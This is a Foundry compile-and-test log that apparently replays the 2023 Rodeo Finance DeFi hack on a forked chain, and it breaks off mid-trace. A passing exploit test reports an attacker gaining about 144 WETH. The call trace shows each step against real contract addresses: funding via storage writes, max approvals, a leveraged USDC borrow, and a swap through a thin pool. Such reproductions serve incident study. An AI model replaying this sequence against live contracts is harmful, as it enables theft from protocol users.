Compiling 28 files with Solc 0.8.25
Solc 0.8.25 finished in 1.39s
Compiler run successful with warnings:
Warning (2519): This declaration shadows an existing declaration.
   --> src/test/interface.sol:886:5:
    |
886 |     function WETH() external view returns (address);
    |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Note: The shadowed declaration is here:
   --> src/test/interface.sol:641:1:
    |
641 | interface WETH {
    | ^ (Relevant source part starts here and spans across multiple lines).

Warning (2519): This declaration shadows an existing declaration.
    --> src/test/interface.sol:1598:5:
     |
1598 |     function WETH() external view returns (address);
     |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Note: The shadowed declaration is here:
   --> src/test/interface.sol:641:1:
    |
641 | interface WETH {
    | ^ (Relevant source part starts here and spans across multiple lines).

Warning (2519): This declaration shadows an existing declaration.
    --> src/test/interface.sol:1850:5:
     |
1850 |     function WETH() external view returns (address);
     |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Note: The shadowed declaration is here:
   --> src/test/interface.sol:641:1:
    |
641 | interface WETH {
    | ^ (Relevant source part starts here and spans across multiple lines).

Warning (2519): This declaration shadows an existing declaration.
    --> src/test/interface.sol:2560:5:
     |
2560 |     function WETH() external view returns (address);
     |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Note: The shadowed declaration is here:
   --> src/test/interface.sol:641:1:
    |
641 | interface WETH {
    | ^ (Relevant source part starts here and spans across multiple lines).

Warning (2519): This declaration shadows an existing declaration.
    --> src/test/interface.sol:3759:5:
     |
3759 |     function WETH() external view returns (address);
     |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Note: The shadowed declaration is here:
   --> src/test/interface.sol:641:1:
    |
641 | interface WETH {
    | ^ (Relevant source part starts here and spans across multiple lines).

Warning (2519): This declaration shadows an existing declaration.
  --> src/test/2023-07/RodeoFinance_exp.sol:54:5:
   |
54 |     IERC20 WETH = IERC20(0x82aF49447D8a07e3bd95BD0d56f35241523fBab1);
   |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Note: The shadowed declaration is here:
   --> src/test/interface.sol:641:1:
    |
641 | interface WETH {
    | ^ (Relevant source part starts here and spans across multiple lines).

Warning (2519): This declaration shadows an existing declaration.
  --> src/test/2023-07/RodeoFinance_exp.sol:55:5:
   |
55 |     IERC20 USDC = IERC20(0xFF970A61A04b1cA14834A43f5dE4533eBDDB5CC8);
   |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Note: The shadowed declaration is here:
    --> src/test/interface.sol:2629:1:
     |
2629 | interface USDC {
     | ^ (Relevant source part starts here and spans across multiple lines).


Ran 1 test for script/Exploit-template_new.sol:ExploitScript
[PASS] testExploit() (gas: 20485)
Logs:
  Attacker ETH Balance Before exploit: 0.000000000000000000
  Attacker ETH Balance After exploit: 0.000000000000000000

Traces:
  [20485] ExploitScript::testExploit()
    в”њв”Ђ [0] VM::deal(ExploitScript: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0)
    в”‚   в””в”Ђ в†ђ [Return] 
    в”њв”Ђ emit log_named_decimal_uint(key: "Attacker ETH Balance Before exploit", val: 0, decimals: 18)
    в”њв”Ђ emit log_named_decimal_uint(key: "Attacker ETH Balance After exploit", val: 0, decimals: 18)
    в””в”Ђ в†ђ [Stop] 

Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 285.69ms (289.53Вµs CPU time)

Ran 1 test for src/test/2023-07/RodeoFinance_exp.sol:RodeoTest
[PASS] testExploit() (gas: 1311515)
Logs:
  Attacker balance of unshETH after exploit: 0.000000000000000000
  Attacker balance of WETH after exploit: 144.219004344154985727

Traces:
  [1632415] RodeoTest::testExploit()
    в”њв”Ђ [2826] unsETH::balanceOf(RodeoTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    в”‚   в””в”Ђ в†ђ [Return] 0
    в”њв”Ђ [0] VM::record()
    в”‚   в””в”Ђ в†ђ [Return] 
    в”њв”Ђ [826] unsETH::balanceOf(RodeoTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    в”‚   в””в”Ђ в†ђ [Return] 0
    в”њв”Ђ [0] VM::accesses(unsETH: [0x0Ae38f7E10A43B5b2fB064B42a2f4514cbA909ef])
    в”‚   в””в”Ђ в†ђ [Return] [0x5223e63f0507f82c7e25e324cdfe3030bae704b36135ec7694b55330a3b5b731], []
    в”њв”Ђ [0] VM::load(unsETH: [0x0Ae38f7E10A43B5b2fB064B42a2f4514cbA909ef], 0x5223e63f0507f82c7e25e324cdfe3030bae704b36135ec7694b55330a3b5b731) [staticcall]
    в”‚   в””в”Ђ в†ђ [Return] 0x0000000000000000000000000000000000000000000000000000000000000000
    в”њв”Ђ emit WARNING_UninitedSlot(who: unsETH: [0x0Ae38f7E10A43B5b2fB064B42a2f4514cbA909ef], slot: 37153082331761329049548104127554374699306059980923752401056316776609547138865 [3.715e76])
    в”њв”Ђ [0] VM::load(unsETH: [0x0Ae38f7E10A43B5b2fB064B42a2f4514cbA909ef], 0x5223e63f0507f82c7e25e324cdfe3030bae704b36135ec7694b55330a3b5b731) [staticcall]
    в”‚   в””в”Ђ в†ђ [Return] 0x0000000000000000000000000000000000000000000000000000000000000000
    в”њв”Ђ [826] unsETH::balanceOf(RodeoTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    в”‚   в””в”Ђ в†ђ [Return] 0
    в”њв”Ђ [0] VM::store(unsETH: [0x0Ae38f7E10A43B5b2fB064B42a2f4514cbA909ef], 0x5223e63f0507f82c7e25e324cdfe3030bae704b36135ec7694b55330a3b5b731, 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff)
    в”‚   в””в”Ђ в†ђ [Return] 
    в”њв”Ђ [826] unsETH::balanceOf(RodeoTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    в”‚   в””в”Ђ в†ђ [Return] 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77]
    в”њв”Ђ [0] VM::store(unsETH: [0x0Ae38f7E10A43B5b2fB064B42a2f4514cbA909ef], 0x5223e63f0507f82c7e25e324cdfe3030bae704b36135ec7694b55330a3b5b731, 0x0000000000000000000000000000000000000000000000000000000000000000)
    в”‚   в””в”Ђ в†ђ [Return] 
    в”њв”Ђ emit SlotFound(who: unsETH: [0x0Ae38f7E10A43B5b2fB064B42a2f4514cbA909ef], fsig: 0x70a08231, keysHash: 0x5ff10565516c110180bb9cc111cdbc2b0a68e09ff7fac17290373c3aa4a1bb03, slot: 37153082331761329049548104127554374699306059980923752401056316776609547138865 [3.715e76])
    в”њв”Ђ [0] VM::load(unsETH: [0x0Ae38f7E10A43B5b2fB064B42a2f4514cbA909ef], 0x5223e63f0507f82c7e25e324cdfe3030bae704b36135ec7694b55330a3b5b731) [staticcall]
    в”‚   в””в”Ђ в†ђ [Return] 0x0000000000000000000000000000000000000000000000000000000000000000
    в”њв”Ђ [0] VM::store(unsETH: [0x0Ae38f7E10A43B5b2fB064B42a2f4514cbA909ef], 0x5223e63f0507f82c7e25e324cdfe3030bae704b36135ec7694b55330a3b5b731, 0x0000000000000000000000000000000000000000000000029056d469efb34f8d)
    в”‚   в””в”Ђ в†ђ [Return] 
    в”њв”Ђ [826] unsETH::balanceOf(RodeoTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    в”‚   в””в”Ђ в†ђ [Return] 47294222088336002957 [4.729e19]
    в”њв”Ђ [24498] unsETH::approve(Router: [0xc873fEcbd354f5A56E00E710B90EF4201db2448d], 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
    в”‚   в”њв”Ђ emit Approval(owner: RodeoTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], spender: Router: [0xc873fEcbd354f5A56E00E710B90EF4201db2448d], value: 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
    в”‚   в””в”Ђ в†ђ [Return] true
    в”њв”Ђ [31808] WETH::approve(Router: [0xc873fEcbd354f5A56E00E710B90EF4201db2448d], 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
    в”‚   в”њв”Ђ [24562] 0x8b194bEae1d3e0788A1a35173978001ACDFba668::approve(Router: [0xc873fEcbd354f5A56E00E710B90EF4201db2448d], 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77]) [delegatecall]
    в”‚   в”‚   в”њв”Ђ emit Approval(owner: RodeoTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], spender: Router: [0xc873fEcbd354f5A56E00E710B90EF4201db2448d], value: 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
    в”‚   в”‚   в””в”Ђ в†ђ [Return] true
    в”‚   в””в”Ђ в†ђ [Return] true
    в”њв”Ђ [38439] USDC::approve(SwapRouter: [0xE592427A0AEce92De3Edee1F18E0157C05861564], 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
    в”‚   в”њв”Ђ [31193] 0x1eFB3f88Bc88f03FD1804A5C53b7141bbEf5dED8::approve(SwapRouter: [0xE592427A0AEce92De3Edee1F18E0157C05861564], 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77]) [delegatecall]
    в”‚   в”‚   в”њв”Ђ emit Approval(owner: RodeoTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], spender: SwapRouter: [0xE592427A0AEce92De3Edee1F18E0157C05861564], value: 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
    в”‚   в”‚   в””в”Ђ в†ђ [Return] true
    в”‚   в””в”Ђ в†ђ [Return] true
    в”њв”Ђ [841532] Investor::earn(RodeoTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x0032F5E1520a66C6E572e96A11fBF54aea26f9bE, 41, 0, 400000000000 [4e11], 0x00000000000000000000000000000000000000000000000000000000000001f4)
    в”‚   в”њв”Ђ [306] 0x0032F5E1520a66C6E572e96A11fBF54aea26f9bE::asset() [staticcall]
    в”‚   в”‚   в””в”Ђ в†ђ [Return] 0x000000000000000000000000ff970a61a04b1ca14834a43f5de4533ebddb5cc8
    в”‚   в”њв”Ђ [646967] 0x6ff76f4794e4A6122734A11d680dBb351533Ae95::edit(3193, 0, 400000000000 [4e11], 0x00000000000000000000000000000000000000000000000000000000000001f4)
    в”‚   в”‚   в”њв”Ђ [7369] Investor::positions(3193) [staticcall]
    в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 0x0000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e14960000000000000000000000000032f5e1520a66c6e572e96a11fbf54aea26f9be00000000000000000000000000000000000000000000000000000000000000290000000000000000000000000000000000000000000000000000000064ad0895000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
    в”‚   в”‚   в”њв”Ђ [306] 0x0032F5E1520a66C6E572e96A11fBF54aea26f9bE::asset() [staticcall]
    в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 0x000000000000000000000000ff970a61a04b1ca14834a43f5de4533ebddb5cc8
    в”‚   в”‚   в”њв”Ђ [521] Investor::strategies(41) [staticcall]
    в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 0x0000000000000000000000009e058177a854336d962d5ae576e9a46cfd8374d7
    в”‚   в”‚   в”њв”Ђ [1369] Investor::positions(3193) [staticcall]
    в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 0x0000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e14960000000000000000000000000032f5e1520a66c6e572e96a11fbf54aea26f9be00000000000000000000000000000000000000000000000000000000000000290000000000000000000000000000000000000000000000000000000064ad0895000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
    в”‚   в”‚   в”њв”Ђ [53295] 0x0032F5E1520a66C6E572e96A11fBF54aea26f9bE::borrow(400000000000 [4e11])
    в”‚   в”‚   в”‚   в”њв”Ђ [3296] USDC::balanceOf(0x0032F5E1520a66C6E572e96A11fBF54aea26f9bE) [staticcall]
    в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [2553] 0x1eFB3f88Bc88f03FD1804A5C53b7141bbEf5dED8::balanceOf(0x0032F5E1520a66C6E572e96A11fBF54aea26f9bE) [delegatecall]
    в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 1741376033697 [1.741e12]
    в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 1741376033697 [1.741e12]
    в”‚   в”‚   в”‚   в”њв”Ђ [574] 0x627ea8812ef561D6ad9308D2A63e36901f51E3E5::rate(564647729560057260 [5.646e17]) [staticcall]
    в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 0x000000000000000000000000000000000000000000000000000000004842db1d
    в”‚   в”‚   в”‚   в”њв”Ђ [1296] USDC::balanceOf(0x0032F5E1520a66C6E572e96A11fBF54aea26f9bE) [staticcall]
    в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [553] 0x1eFB3f88Bc88f03FD1804A5C53b7141bbEf5dED8::balanceOf(0x0032F5E1520a66C6E572e96A11fBF54aea26f9bE) [delegatecall]
    в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 1741376033697 [1.741e12]
    в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 1741376033697 [1.741e12]
    в”‚   в”‚   в”‚   в”њв”Ђ [16297] USDC::transfer(0x6ff76f4794e4A6122734A11d680dBb351533Ae95, 400000000000 [4e11])
    в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [15551] 0x1eFB3f88Bc88f03FD1804A5C53b7141bbEf5dED8::transfer(0x6ff76f4794e4A6122734A11d680dBb351533Ae95, 400000000000 [4e11]) [delegatecall]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ emit Transfer(from: 0x0032F5E1520a66C6E572e96A11fBF54aea26f9bE, to: 0x6ff76f4794e4A6122734A11d680dBb351533Ae95, value: 400000000000 [4e11])
    в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] true
    в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] true
    в”‚   в”‚   в”‚   в”њв”Ђ emit Borrow(param0: 0x6ff76f4794e4A6122734A11d680dBb351533Ae95, param1: 400000000000 [4e11], param2: 382349705467 [3.823e11])
    в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 382349705467 [3.823e11]
    в”‚   в”‚   в”њв”Ђ [28597] USDC::transfer(0x023be37efd018Ce6B2707eA7452012642B6A5000, 400000000000 [4e11])
    в”‚   в”‚   в”‚   в”њв”Ђ [27851] 0x1eFB3f88Bc88f03FD1804A5C53b7141bbEf5dED8::transfer(0x023be37efd018Ce6B2707eA7452012642B6A5000, 400000000000 [4e11]) [delegatecall]
    в”‚   в”‚   в”‚   в”‚   в”њв”Ђ emit Transfer(from: 0x6ff76f4794e4A6122734A11d680dBb351533Ae95, to: 0x023be37efd018Ce6B2707eA7452012642B6A5000, value: 400000000000 [4e11])
    в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] true
    в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] true
    в”‚   в”‚   в”њв”Ђ [404962] 0x023be37efd018Ce6B2707eA7452012642B6A5000::mint(0x9E058177A854336D962D5aE576E9A46cFd8374D7, USDC: [0xFF970A61A04b1cA14834A43f5dE4533eBDDB5CC8], 400000000000 [4e11], 0x00000000000000000000000000000000000000000000000000000000000001f4)
    в”‚   в”‚   в”‚   в”њв”Ђ [27939] USDC::approve(0x9E058177A854336D962D5aE576E9A46cFd8374D7, 400000000000 [4e11])
    в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [27193] 0x1eFB3f88Bc88f03FD1804A5C53b7141bbEf5dED8::approve(0x9E058177A854336D962D5aE576E9A46cFd8374D7, 400000000000 [4e11]) [delegatecall]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ emit Approval(owner: 0x023be37efd018Ce6B2707eA7452012642B6A5000, spender: 0x9E058177A854336D962D5aE576E9A46cFd8374D7, value: 400000000000 [4e11])
    в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] true
    в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] true
    в”‚   в”‚   в”‚   в”њв”Ђ [370574] 0x9E058177A854336D962D5aE576E9A46cFd8374D7::mint(USDC: [0xFF970A61A04b1cA14834A43f5dE4533eBDDB5CC8], 400000000000 [4e11], 0x00000000000000000000000000000000000000000000000000000000000001f4)
    в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [2826] unsETH::balanceOf(0x9E058177A854336D962D5aE576E9A46cFd8374D7) [staticcall]
    в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 5545436473013793 [5.545e15]
    в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [29563] USDC::transferFrom(0x023be37efd018Ce6B2707eA7452012642B6A5000, 0x9E058177A854336D962D5aE576E9A46cFd8374D7, 400000000000 [4e11])
    в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [28811] 0x1eFB3f88Bc88f03FD1804A5C53b7141bbEf5dED8::transferFrom(0x023be37efd018Ce6B2707eA7452012642B6A5000, 0x9E058177A854336D962D5aE576E9A46cFd8374D7, 400000000000 [4e11]) [delegatecall]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ emit Transfer(from: 0x023be37efd018Ce6B2707eA7452012642B6A5000, to: 0x9E058177A854336D962D5aE576E9A46cFd8374D7, value: 400000000000 [4e11])
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ emit Approval(owner: 0x023be37efd018Ce6B2707eA7452012642B6A5000, spender: 0x9E058177A854336D962D5aE576E9A46cFd8374D7, value: 0)
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] true
    в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] true
    в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [27939] USDC::approve(0x72f7101371201CeFd43Af026eEf1403652F115EE, 400000000000 [4e11])
    в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [27193] 0x1eFB3f88Bc88f03FD1804A5C53b7141bbEf5dED8::approve(0x72f7101371201CeFd43Af026eEf1403652F115EE, 400000000000 [4e11]) [delegatecall]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ emit Approval(owner: 0x9E058177A854336D962D5aE576E9A46cFd8374D7, spender: 0x72f7101371201CeFd43Af026eEf1403652F115EE, value: 400000000000 [4e11])
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] true
    в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] true
    в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [286883] 0x72f7101371201CeFd43Af026eEf1403652F115EE::swap(USDC: [0xFF970A61A04b1cA14834A43f5dE4533eBDDB5CC8], unsETH: [0x0Ae38f7E10A43B5b2fB064B42a2f4514cbA909ef], 400000000000 [4e11], 500, 0x9E058177A854336D962D5aE576E9A46cFd8374D7)
    в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [31563] USDC::transferFrom(0x9E058177A854336D962D5aE576E9A46cFd8374D7, 0x7FC67A688F464538259E3F559dc63F00D64F3c0b, 400000000000 [4e11])
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [30811] 0x1eFB3f88Bc88f03FD1804A5C53b7141bbEf5dED8::transferFrom(0x9E058177A854336D962D5aE576E9A46cFd8374D7, 0x7FC67A688F464538259E3F559dc63F00D64F3c0b, 400000000000 [4e11]) [delegatecall]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ emit Transfer(from: 0x9E058177A854336D962D5aE576E9A46cFd8374D7, to: 0x7FC67A688F464538259E3F559dc63F00D64F3c0b, value: 400000000000 [4e11])
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ emit Approval(owner: 0x9E058177A854336D962D5aE576E9A46cFd8374D7, spender: 0x72f7101371201CeFd43Af026eEf1403652F115EE, value: 0)
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] true
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] true
    в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [200] 0xf3721d8A2c051643e06BF2646762522FA66100dA::decimals() [staticcall]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 18
    в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [11415] 0xf3721d8A2c051643e06BF2646762522FA66100dA::latestAnswer() [staticcall]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 4219270877931510930757 [4.219e21]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [379] unsETH::decimals() [staticcall]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 18
    в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [3121] USDC::decimals() [staticcall]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [2381] 0x1eFB3f88Bc88f03FD1804A5C53b7141bbEf5dED8::decimals() [delegatecall]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 6
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 6
    в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [5618] 0x50834F3163758fcC1Df9973b6e91f0F0F0434aD3::decimals() [staticcall]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [276] 0x2946220288DbBF77dF0030fCecc2a8348CbBE32C::decimals() [staticcall]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 8
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 8
    в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [10137] 0x50834F3163758fcC1Df9973b6e91f0F0F0434aD3::latestAnswer() [staticcall]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [7141] 0x2946220288DbBF77dF0030fCecc2a8348CbBE32C::latestAnswer() [staticcall]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 99992535 [9.999e7]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 99992535 [9.999e7]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [826] unsETH::balanceOf(0x9E058177A854336D962D5aE576E9A46cFd8374D7) [staticcall]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 5545436473013793 [5.545e15]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [193980] 0x7FC67A688F464538259E3F559dc63F00D64F3c0b::swap(USDC: [0xFF970A61A04b1cA14834A43f5dE4533eBDDB5CC8], 0xff970a61a04b1ca14834a43f5de4533ebddb5cc882af49447d8a07e3bd95bd0d56f35241523fbab10ae38f7e10a43b5b2fb064b42a2f4514cba909ef, 400000000000 [4e11], 90056231039207496798 [9.005e19], 0x9E058177A854336D962D5aE576E9A46cFd8374D7)
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [27939] USDC::approve(Router: [0xc873fEcbd354f5A56E00E710B90EF4201db2448d], 400000000000 [4e11])
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [27193] 0x1eFB3f88Bc88f03FD1804A5C53b7141bbEf5dED8::approve(Router: [0xc873fEcbd354f5A56E00E710B90EF4201db2448d], 400000000000 [4e11]) [delegatecall]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ emit Approval(owner: 0x7FC67A688F464538259E3F559dc63F00D64F3c0b, spender: Router: [0xc873fEcbd354f5A56E00E710B90EF4201db2448d], value: 400000000000 [4e11])
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] true
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] true
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [156068] Router::swapExactTokensForTokensSupportingFeeOnTransferTokens(400000000000 [4e11], 90056231039207496798 [9.005e19], [0xFF970A61A04b1cA14834A43f5dE4533eBDDB5CC8, 0x82aF49447D8a07e3bd95BD0d56f35241523fBab1, 0x0Ae38f7E10A43B5b2fB064B42a2f4514cbA909ef], 0x9E058177A854336D962D5aE576E9A46cFd8374D7, 0x0000000000000000000000000000000000000000, 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [14463] USDC::transferFrom(0x7FC67A688F464538259E3F559dc63F00D64F3c0b, 0x84652bb2539513BAf36e225c930Fdd8eaa63CE27, 400000000000 [4e11])
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [13711] 0x1eFB3f88Bc88f03FD1804A5C53b7141bbEf5dED8::transferFrom(0x7FC67A688F464538259E3F559dc63F00D64F3c0b, 0x84652bb2539513BAf36e225c930Fdd8eaa63CE27, 400000000000 [4e11]) [delegatecall]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ emit Transfer(from: 0x7FC67A688F464538259E3F559dc63F00D64F3c0b, to: 0x84652bb2539513BAf36e225c930Fdd8eaa63CE27, value: 400000000000 [4e11])
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ emit Approval(owner: 0x7FC67A688F464538259E3F559dc63F00D64F3c0b, spender: Router: [0xc873fEcbd354f5A56E00E710B90EF4201db2448d], value: 0)
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] true
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] true
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [826] unsETH::balanceOf(0x9E058177A854336D962D5aE576E9A46cFd8374D7) [staticcall]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 5545436473013793 [5.545e15]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [2529] 0x84652bb2539513BAf36e225c930Fdd8eaa63CE27::getReserves() [staticcall]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 700374380195056990765 [7.003e20], 1319974189891 [1.319e12], 300
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [1296] USDC::balanceOf(0x84652bb2539513BAf36e225c930Fdd8eaa63CE27) [staticcall]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [553] 0x1eFB3f88Bc88f03FD1804A5C53b7141bbEf5dED8::balanceOf(0x84652bb2539513BAf36e225c930Fdd8eaa63CE27) [delegatecall]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 1719974189891 [1.719e12]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 1719974189891 [1.719e12]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [5736] 0x84652bb2539513BAf36e225c930Fdd8eaa63CE27::getAmountOut(400000000000 [4e11], USDC: [0xFF970A61A04b1cA14834A43f5dE4533eBDDB5CC8]) [staticcall]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 0x000000000000000000000000000000000000000000000008cf35893bb7082684
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [37917] 0x84652bb2539513BAf36e225c930Fdd8eaa63CE27::swap(162504943618860000900 [1.625e20], 0, 0x29fC01f04032c76cA40f353c7dF685f4444c15eD, 0x, 0x0000000000000000000000000000000000000000)
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [13800] WETH::transfer(0x29fC01f04032c76cA40f353c7dF685f4444c15eD, 162504943618860000900 [1.625e20])
